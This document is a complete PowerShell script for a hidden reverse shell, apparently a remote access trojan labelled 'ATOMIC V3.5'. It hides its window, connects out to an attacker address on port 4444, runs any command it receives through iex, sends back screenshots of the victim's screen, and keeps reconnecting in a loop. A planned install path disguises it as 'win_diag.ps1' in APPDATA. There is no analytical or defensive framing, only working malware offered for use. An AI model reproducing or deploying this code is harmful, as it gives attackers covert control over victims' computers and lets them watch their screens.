# --- CONFIG ---
$ip = '192.168.1.15'
$port = 4444
$installPath = "$env:APPDATA\win_diag.ps1"

# --- 1. BOOT LOOP ---
while($true) {
    try {
        # Check if hardware Wi-Fi is even "UP" before trying anything
        while (!( [System.Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable() )) {
            Start-Sleep -Seconds 5
        }

        # --- 2. DELAYED WINDOW HIDE ---
        Start-Sleep -Seconds 2
        try {
            $s = '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);'
            $type = Add-Type -M $s -Name "W$([Guid]::NewGuid().ToString().Replace('-',''))" -Pass
            [void]$type::ShowWindow((gps -id $pid).MainWindowHandle, 0)
        } catch { }

        # --- 3. CONNECTION ---
        $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $s = $c.GetStream(); $w = New-Object System.IO.StreamWriter($s); $w.AutoFlush = $true
        $r = New-Object System.IO.StreamReader($s)
        
        $w.WriteLine("--- ATOMIC V3.5 + SCREENSHOT ONLINE: $env:COMPUTERNAME ---")

        while($c.Connected) {
            $w.Write("PS " + (Get-Location).Path + "> ")
            $line = $r.ReadLine()
            if ($null -eq $line -or $line -eq "exit") { break }
            
            $cmd = $line.Trim()

            # --- 4. SCREENSHOT BRANCH ---
            if ($cmd -eq "screenshot") {
                try {
                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                    $g = [System.Drawing.Graphics]::FromImage($bmp)
                    $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                    $ms = New-Object System.IO.MemoryStream
                    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                    $w.WriteLine([Convert]::ToBase64String($ms.ToArray()))
                    $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
                } catch { $w.WriteLine("Screenshot Error: $($_.Exception.Message)") }
            } 
            else {
                # Normal Command Execution
                $out = try { iex $line 2>&1 | Out-String } catch { $_.Exception.Message }
                $w.WriteLine($out)
            }
        }
    } catch { 
        Start-Sleep -Seconds 20 
    } finally {
        if ($c) { $c.Close() }
    }
}
